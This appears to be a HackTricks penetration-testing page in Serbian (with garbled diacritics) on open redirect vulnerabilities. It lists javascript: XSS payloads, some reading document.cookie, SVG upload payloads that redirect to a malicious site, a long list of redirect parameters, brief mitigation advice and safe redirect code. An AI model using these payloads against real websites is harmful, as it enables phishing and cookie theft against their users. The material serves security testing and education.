<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


# Open redirect

## Preusmeravanje na localhost ili proizvoljne domene

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

## Open Redirect na XSS
```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
# Otvoreno preusmeravanje pri otpremanju svg datoteka

## Opis

Otvoreno preusmeravanje je bezbednosni propust koji omogu캖ava napada캜u da preusmeri korisnika sa legitimne veb stranice na zlonamernu stranicu. Ovaj propust mo쬰 biti iskori코캖en prilikom otpremanja SVG (Scalable Vector Graphics) datoteka na veb stranicu.

## Kako iskoristiti propust

Da biste iskoristili ovaj propust, sledite slede캖e korake:

1. Identifikujte veb stranicu koja omogu캖ava otpremanje SVG datoteka.
2. Otpremite SVG datoteku koja sadr쬴 URL preusmeravanje. Na primer:

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    window.location.href = "http://zlonamerna-stranica.com";
  </script>
</svg>
```

3. Proverite da li je preusmeravanje uspe코no izvr코eno tako 코to 캖ete posetiti veb stranicu koja je prikazana u SVG datoteci.

## Kako se za코tititi

Da biste se za코titili od ovog propusta, preporu캜uje se slede캖e:

- Validirajte i filtrirajte unose korisnika kako biste spre캜ili ubacivanje skripti ili URL preusmeravanja.
- Koristite belu listu ili sigurnosne politike za preusmeravanje, tako da samo odre캠ene adrese mogu biti kori코캖ene za preusmeravanje.
- Redovno a쬿rirajte softver i biblioteke koje se koriste za obradu SVG datoteka kako biste ispravili poznate bezbednosne propuste.

## Dodatne informacije

Otvoreno preusmeravanje je 캜est propust u veb aplikacijama i mo쬰 biti iskori코캖en za izvo캠enje razli캜itih napada, uklju캜uju캖i fi코ing, preusmeravanje na zlonamerne stranice ili kra캠u korisni캜kih podataka. Va쬹o je da razvijatelji i administratori veb stranica budu svesni ovog propusta i preduzmu odgovaraju캖e mere za코tite.
```markup
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```
# Uobi캜ajeni parametri za ubrizgavanje

When testing for open redirect vulnerabilities, it is important to understand the common injection parameters that can be exploited. These parameters are often found in the URL or in the request parameters. Here are some examples:

- **url**: This parameter is used to specify the target URL. Attackers can manipulate this parameter to redirect users to malicious websites.
- **redirect**: This parameter is used to specify the redirect URL. Attackers can modify this parameter to redirect users to a different website.
- **next**: This parameter is commonly used in login and authentication flows to redirect users after successful login. Attackers can abuse this parameter to redirect users to malicious sites.
- **return**: This parameter is often used in logout flows to redirect users after logging out. Attackers can tamper with this parameter to redirect users to malicious destinations.
- **callback**: This parameter is commonly used in JSONP (JSON with Padding) requests to specify the callback function. Attackers can manipulate this parameter to redirect users to malicious sites.

By understanding these common injection parameters, you can effectively identify and exploit open redirect vulnerabilities during penetration testing.
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```
# Primeri koda

### .Net
```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```
### Java

Java je objektno orijentisani programski jezik koji se 캜esto koristi za razvoj web aplikacija. Ovde su neke od tehnika koje mo쬰te koristiti za hakovanje Java aplikacija:

#### Otvaranje preusmerenja (Open Redirect)

Otvaranje preusmerenja je tehnika koja se koristi za preusmeravanje korisnika sa legitimne web stranice na zlonamernu stranicu. Ova tehnika se 캜esto koristi za izvo캠enje napada na korisnike, kao 코to su kra캠a podataka za prijavu ili 코irenje zlonamernog softvera.

Da biste prona코li ranjivosti otvaranja preusmerenja u Java aplikacijama, mo쬰te iskoristiti slede캖e metode:

1. Proverite da li aplikacija koristi parametre za preusmeravanje korisnika. Ovi parametri se 캜esto nazivaju "redirect" ili "url" i mogu biti deo URL adrese ili deo HTTP zahteva.
2. Poku코ajte da promenite vrednost parametara za preusmeravanje kako biste videli da li mo쬰te preusmeriti korisnika na drugu stranicu.
3. Proverite da li aplikacija vr코i proveru ispravnosti URL adrese pre nego 코to izvr코i preusmeravanje. Ako ne vr코i proveru, mo쬰te poku코ati da preusmerite korisnika na bilo koju stranicu.

Kada prona캠ete ranjivost otvaranja preusmerenja, mo쬰te je iskoristiti na slede캖i na캜in:

1. Kreirajte zlonamernu URL adresu koja 캖e preusmeriti korisnika na zlonamernu stranicu.
2. Prosledite zlonamernu URL adresu korisniku, na primer putem phishing poruke ili manipulacijom legitimne web stranice.
3. Kada korisnik klikne na zlonamernu URL adresu, bi캖e preusmeren na zlonamernu stranicu, gde mo쬰te izvr코iti napad.

Da biste se za코titili od ranjivosti otvaranja preusmerenja, preporu캜uje se slede캖e:

1. Proverite sve ulazne parametre koji se koriste za preusmeravanje korisnika i vr코ite proveru ispravnosti URL adrese pre nego 코to izvr코ite preusmeravanje.
2. Koristite sigurne metode za preusmeravanje korisnika, kao 코to su metode koje koriste samo unapred definisane URL adrese ili metode koje koriste bele쬰nje preusmerenja.
3. Redovno a쬿rirajte i proveravajte bezbednost va코e Java aplikacije kako biste otkrili i ispravili ranjivosti.
```bash
response.redirect("http://mysafedomain.com");
```
### PHP

PHP je popularan jezik za izradu web aplikacija. Me캠utim, kao i kod svih jezika, postoje sigurnosni propusti koji mogu biti iskori코캖eni. Jedan od takvih propusta je otvoreno preusmeravanje (open redirect) koji omogu캖ava napada캜u da preusmeri korisnika na bilo koju drugu URL adresu.

Otvoreno preusmeravanje se javlja kada aplikacija koristi korisni캜ki unos za konstrukciju URL adrese za preusmeravanje, ali ne vr코i adekvatnu proveru ili validaciju unosa. To omogu캖ava napada캜u da manipuli코e URL-om i preusmeri korisnika na zlonamernu stranicu.

Napada캜 mo쬰 iskoristiti otvoreno preusmeravanje na razli캜ite na캜ine. Na primer, mo쬰 kreirati URL koji izgleda legitimno, ali vodi korisnika na phishing stranicu koja poku코ava da ukrade njegove podatke za prijavljivanje. Tako캠e, napada캜 mo쬰 iskoristiti otvoreno preusmeravanje za izvo캠enje napada na druge korisnike, kao 코to je preusmeravanje na zlonamerni sadr쬬j ili skriptu.

Da biste spre캜ili otvoreno preusmeravanje, trebali biste vr코iti adekvatnu validaciju korisni캜kog unosa i proveravati da li URL adresa pripada va코em domenu ili dozvoljenim domenima. Tako캠e, preporu캜uje se kori코캖enje sigurnih metoda za preusmeravanje, kao 코to je kori코캖enje funkcije `header()` u PHP-u.

Ukratko, otvoreno preusmeravanje je sigurnosni propust koji omogu캖ava napada캜u da preusmeri korisnika na zlonamernu stranicu. Da biste se za코titili od ovog propusta, trebali biste vr코iti adekvatnu validaciju korisni캜kog unosa i koristiti sigurne metode za preusmeravanje.
```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```
# Alati

* [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)

# Resursi

* U [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect) mo쬰te prona캖i liste za fuzzing.\
* [https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)\
* [https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
* [https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a](https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a)


<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
